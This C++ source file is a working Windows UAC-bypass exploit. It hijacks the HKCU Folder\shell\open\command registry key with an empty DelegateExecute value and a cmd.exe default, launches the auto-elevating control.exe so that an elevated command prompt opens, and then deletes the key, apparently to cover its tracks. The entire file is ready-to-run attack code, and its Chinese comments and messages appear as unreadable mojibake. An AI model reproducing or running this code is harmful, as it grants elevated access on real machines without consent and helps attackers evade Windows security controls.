#include <Windows.h>
#include <tchar.h>
#include <iostream>

int main() {
    HKEY hKey; // ע�����
    LPCWSTR subKey = L"Software\\Classes\\Folder\\shell\\open\\command"; // �Ӽ�·��
    LPCWSTR valueName = L"DelegateExecute"; // ��ֵ����
    LPCWSTR data = L""; // ��ֵ���ݣ����ַ�����

    // �򿪻򴴽�ע�����
    LONG result = RegCreateKeyEx(
        HKEY_CURRENT_USER,              // ������HKCU
        subKey,                         // �Ӽ�·��
        0,                              // ����������Ϊ0
        NULL,                           // �����ͣ�ͨ��ΪNULL��
        REG_OPTION_NON_VOLATILE,        // ע��������ԣ�����ʧ�ԣ�
        KEY_WRITE,                      // Ȩ�ޣ�д��
        NULL,                           // ��ȫ����
        &hKey,                          // ���ص�ע�����
        NULL                            // �Ƿ��½��ı�־����ΪNULL��
    );

    // д���ֵ
    result = RegSetValueEx(
        hKey,                       // �򿪵�ע�����
        valueName,                  // ��ֵ����
        0,                          // ����������Ϊ0
        REG_SZ,                     // �������ͣ��ַ�����
        (const BYTE*)data,          // ����
        (DWORD)((wcslen(data) + 1) * sizeof(wchar_t)) // ���ݴ�С��������ֹ��
    );
    if (result == ERROR_SUCCESS) {
        printf("command д��ɹ�\n");
    }

    LPCWSTR defaultValue = NULL; // Ĭ��ֵ�ļ���Ϊ NULL
    LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe"; // Ҫ���õ�ֵ���滻Ϊ��� CMD

    LONG res = RegSetValueEx(
        hKey,
        defaultValue,
        0,                          // ����������Ϊ0
        REG_SZ,                     // �������ͣ��ַ�����
        (const BYTE*)cmd,          // ����
        (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)) // ���ݴ�С��������ֹ��
    );
    if (res == ERROR_SUCCESS) {
        printf("cmdд��ɹ�\n");
    }

    int re = system("C:\\Windows\\System32\\control.exe");

    if (re == 0) {
        // ִ�гɹ�
        printf("����ִ�гɹ�.\n");
    }

    LONG resu = RegDeleteKey(
        HKEY_CURRENT_USER,   // ������HKEY_CURRENT_USER
        subKey               // Ҫɾ�����Ӽ�·��
    );

    if (resu == ERROR_SUCCESS) {
        printf("����ۼ�");
    }

    return 0;
}
